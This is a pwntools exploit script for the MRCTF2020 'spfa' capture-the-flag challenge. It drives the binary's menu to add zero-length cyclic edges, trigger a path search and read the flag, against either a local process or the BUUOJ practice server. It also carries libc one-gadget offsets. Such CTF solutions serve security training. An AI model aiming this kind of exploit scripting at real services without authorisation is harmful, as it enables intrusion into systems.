#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/29 12:06:49
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
import inspect
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./mrctf2020_spfa"
menu = "4. exit:"
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "~/Desktop/Pwn/libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "~/Desktop/Pwn/libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 1
    sh = remote(IP,port)

def info(var):
    callers_local_vars = inspect.currentframe().f_back.f_locals.items()
    varname = callers_local_vars[var_name]
    log.info(varname+"=>{}".format(hex(var)))

def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(start,finish,length):
    cmd(1)
    sh.recvuntil("input from to and length:\n")
    sh.sendline(str(start))
    sh.sendline(str(finish))
    sh.sendline(str(length))

def find_path(start,finish):
    cmd(2)
    sh.recvuntil("input from and to:\n")
    sh.sendline(str(start))
    sh.sendline(str(finish))

def getflag():
    cmd(3)

add(1,2,0)
add(2,1,0)
find_path(1,2)
getflag()
sh.interactive()
